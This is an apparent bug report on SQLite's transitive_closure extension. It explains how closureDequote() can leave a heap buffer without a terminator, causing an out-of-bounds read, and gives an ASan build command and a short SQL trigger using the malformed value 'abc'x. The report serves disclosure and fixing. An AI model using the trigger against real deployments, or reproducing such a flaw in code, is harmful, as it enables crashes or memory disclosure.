Summary
closureDequote() (ext/misc/closure.c:438) only NUL-terminates its output as a side effect when the closing quote is the last input byte, so a vtab argument value with trailing bytes after the closing quote (for example 'abc'x) leaves a non-terminated heap buffer that sqlite3_mprintf("%w", ...) in closureFilter later scans past the end of (CWE-908 and CWE-125).

Reproduce
closure is a loadable extension and is not built into the binary, so first compile it into closure.so from the source tree (this is the normal supported way to use it, it only registers the transitive_closure module through the public init API).
gcc -g -DNDEBUG -fsanitize=address -shared -fPIC \
-I/data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/closure.c -o closure.so

The SQL that triggers it (the value 'abc'x has a trailing byte after the closing quote, then a query drives the %w scan):
.load ./closure.so
CREATE TABLE t(p, a);
INSERT INTO t VALUES(1, 2);
CREATE VIRTUAL TABLE c USING transitive_closure(idcolumn='abc'x, tablename='t', parentcolumn='p');
SELECT * FROM c WHERE root=1;

